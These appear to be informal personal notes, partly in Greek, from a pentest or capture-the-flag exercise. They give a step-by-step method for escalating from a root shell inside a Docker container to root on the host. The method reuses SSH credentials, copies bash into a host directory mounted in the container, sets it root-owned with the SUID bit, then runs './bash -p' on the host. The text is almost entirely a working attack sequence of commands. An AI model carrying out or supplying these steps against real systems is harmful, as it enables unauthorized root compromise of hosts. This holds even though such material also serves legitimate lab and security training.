You get into a user/admin but you are in a Docker (you can find out by: ls -al and notice that all the files has 1000 privs...that means that we r in a users docker)
plus with the command "mount" you can be sure that you are in a container with something like this " /dev/sda1 on /home/usersname..."

so you r in a docker shell
its common that this shell has as broadcast the addre x.x.x.1

for example if you have in docker the 172.19.0.2 then .1 is your host.
so:
1) ping 172.19.0.1
2) if there is ssh for a user: ssh name@ip like: shh john@172.19.0.1
  try to reuse the creds there
3)you are in. try the --> ip addr
now  that you r at host machine you will copy the bash file/program in the user's container (user directory is mounted in the Docker container)
then you will exit
4) exit
and get in docker shell again. Now if you ls -al you will see the bash file.
5) chown root:root bash
6) chmod 4755 bash               (Το SUID flag (4 στο 4755) σημαίνει ότι όταν οποιοσδήποτε χρήστης εκτελέσει αυτό το αρχείο, θα τρέξει με τα δικαιώματα του ιδιοκτήτη του αρχείου (δηλαδή του root))
7) ls -al bash
now you have a bash with root priv's
8) connect to host again: ssh john@IP
9) and there: ls -al and yo uwill see your bash with root privs
10) ./bash -p    and spawn a shell with the effective UID of root.
11) id   ---> euid=0 root
12) you can cd /root now



THIS WORKS CAUSE:
1) THE HOST DIR IS SHARED TO THE HOST AND CONTAINER
2) WE GOT A ROOT SHELL ON CONTAINER FIRST
